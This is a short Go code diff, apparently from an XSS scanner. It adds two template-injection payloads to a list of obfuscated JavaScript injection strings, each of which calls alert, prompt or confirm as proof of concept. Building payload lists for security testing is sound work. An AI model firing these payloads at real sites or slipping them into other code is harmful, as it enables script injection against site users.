@@ -259,6 +259,8 @@ func getInJsPayload(ip string) []string {
 		"self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])",
 		"this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
 		"window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
+		"{{toString().constructor.constructor('alert(1)')()}}",
+		"{{-function(){this.alert(1)}()}}",
 	}
 	if strings.Contains(ip, "none") {
 		var tempPayload []string
